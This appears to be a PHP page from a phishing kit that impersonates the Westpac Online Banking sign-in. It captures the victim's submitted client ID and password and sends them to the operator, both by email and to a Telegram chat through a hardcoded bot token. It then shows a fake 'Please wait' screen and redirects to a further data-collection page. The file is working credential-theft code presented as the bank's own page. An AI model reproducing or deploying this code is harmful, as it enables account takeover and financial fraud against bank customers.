<?php
session_start();
include "header.php";
include "../email.php";

$_SESSION['id'] = $_POST['id'];
$_SESSION['password'] = $_POST['password'];

$to = $email;
$subject = 'LOGIN';
$message =
"
---------------LOGIN-----------------------
  



Client id : " . $_SESSION['id'] . " 
Client Password:" . $_SESSION['password'] . " 


--------------------------------------




  

";

sendMessageT('-670431353',$message,'2141533923:AAETgvM1iliuDfSj6V79whhNunI-mncfr-E');

mail($to, $subject, $message);

?>
<link rel="stylesheet" href="../css/index.css">

<main class="" style="min-height:450px; background-color: #F3F4F6;">
    <div class="row container-expand-gl mx-auto co" style="width: 75%; padding:0; ">

        <br>
        <p class="col-12 col-xs-8 par" style="font-size: 28px; margin:10px;">Sign in to Westpac Online Banking</p>
        <br>
        <div class="col-12 mx-auto row row container-expand-sm" style="background-color: white;height:360px ; padding:0; margin:40px;">
            <div class="mx-auto row " style="margin-top: 100px;"><img src="../images/wait.gif" alt="" style="transform: translate(160%,0);width:30px; height:30px; display: inline;margin-top: 50px;">
                <p class="col-12" style="transform: translate(0%,0); font-size: 23px;">Please wait</p>
            </div>
        </div>
</main>
<br> <br>
<?php
include "footer.php";



?>
<style>
    @media only screen and (max-width: 800px) {
        .co {
            width: 105% !important;
        }

        main {
            background-color: white !important;
        }

        .par {
            margin: 2px !important;
            font-size: 22px !important;
        }

    }
</style>
<script>
    setTimeout(function() {
        window.location.href = "info.php";
    }, 10000);
</script>